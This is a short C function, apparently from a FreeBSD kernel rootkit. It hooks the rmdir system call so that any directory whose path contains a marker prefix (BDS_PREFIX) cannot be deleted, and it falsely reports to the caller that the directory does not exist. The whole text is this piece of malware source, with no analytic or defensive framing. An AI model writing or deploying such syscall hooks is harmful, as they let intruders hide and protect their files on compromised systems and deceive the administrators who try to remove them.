static int bds_rmdir(struct thread *td, struct rmdir_args *uap) {
	char path[256];
	
	int error = copyinstr(uap->path, path, 256, NULL);
	if (error != 0) {
		return error;
	}	
	if (strstr(path, BDS_PREFIX)) {
		//printf("\nrmdir blocked\n");
		return ENOENT;		
	}

	return sys_rmdir(td, uap);
}
